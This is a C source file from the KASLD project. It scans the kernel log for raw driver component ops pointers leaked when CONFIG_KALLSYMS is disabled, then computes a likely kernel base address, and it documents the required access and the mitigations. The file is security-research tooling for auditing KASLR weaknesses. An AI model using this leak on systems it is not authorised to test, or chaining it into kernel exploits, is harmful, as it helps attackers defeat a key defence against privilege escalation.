// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Search kernel log for driver component ops pointers.
//
// The `component_bind` and `__component_add` functions print ops functions
// to the kernel log:
//
//   dev_dbg(master->parent, "binding %s (ops %ps)\n",
//   dev_info(master->parent, "bound %s (ops %ps)\n",
//   dev_err(master->parent, "failed to bind %s (ops %ps): %d\n",
//   dev_dbg(dev, "adding component (ops %ps)\n", ops);
//
// The "%ps" printk format prints the symbol name; however, if kernel symbols
// are disabled (CONFIG_KALLSYMS=n) then raw pointers are printed instead.
//
// Kernels may be compiled without debugging symbols to decrease the size of
// the kernel image.
//
// Leak primitive:
//   Data leaked:      kernel function pointers (driver component ops)
//   Kernel subsystem: drivers/base/component — component_bind/__component_add
//   Data structure:   struct component_ops function pointers
//   Address type:     virtual (kernel text / module text)
//   Method:           parsed (dmesg string)
//   Status:           unfixed (requires CONFIG_KALLSYMS=n to leak raw pointers)
//   Access check:     do_syslog() → check_syslog_permissions(); gated by
//                     dmesg_restrict
//   Source:
//   https://elixir.bootlin.com/linux/v5.15.12/source/drivers/base/component.c
//
// Mitigations:
//   CONFIG_KALLSYMS=y causes %ps to print symbol names instead of raw
//   pointers. Access gated by dmesg_restrict (see dmesg.h for shared
//   access gate details).
//
// Requires:
// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities; or
//   readable /var/log/dmesg.
// - CONFIG_KALLSYMS=n
//
// References:
// https://elixir.bootlin.com/linux/v5.15.12/source/drivers/base/component.c
// https://cateee.net/lkddb/web-lkddb/KALLSYMS.html
// https://www.kernel.org/doc/html/latest/core-api/printk-formats.html
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "include/dmesg.h"
#include "include/kasld.h"
#include "include/kasld_internal.h"
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

KASLD_EXPLAIN(
    "Searches dmesg for raw function pointer values printed by the "
    "driver component framework (ops 0x...). When CONFIG_KALLSYMS is "
    "disabled, the kernel prints raw %p pointers instead of symbolized "
    "names. These pointers are kernel text or module virtual addresses. "
    "Access is gated by dmesg_restrict.");

KASLD_META("method:parsed\n"
           "phase:inference\n"
           "addr:virtual\n"
           "sysctl:dmesg_restrict>=1\n"
           "bypass:CAP_SYSLOG\n"
           "fallback:/var/log/dmesg\n");

static const char *needle = " (ops 0x";

static int on_match(const char *line, void *ctx) {
  unsigned long *lowest = ctx;
  char *endptr;

  const char *p = strstr(line, needle);
  if (!p)
    return 1;

  unsigned long addr = strtoul(p + strlen(needle), &endptr, 16);

  if (addr && addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX) {
    if (!*lowest || addr < *lowest)
      *lowest = addr;
  }

  return 1; /* keep scanning for lowest */
}

int main(void) {
  unsigned long addr = 0;

  printf("[.] searching dmesg for driver component ops pointers ...\n");
  int ds = dmesg_search(" (ops 0x", on_match, &addr);

  if (!addr) {
    if (ds < 0)
      return KASLD_EXIT_NOPERM;
    printf("[-] driver component ops pointers not found in dmesg\n");
    return 0;
  }

  printf("lowest leaked address: %lx\n", addr);
  printf("possible kernel base: %lx\n", addr & -KERNEL_ALIGN);
  /* The leaked address is a struct component_ops function pointer
   * (driver bind/unbind) — within kernel text but the specific symbol
   * varies by driver. */
  kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_TEXT, addr,
               KASLD_REGION_KERNEL_TEXT, NULL);

  return 0;
}
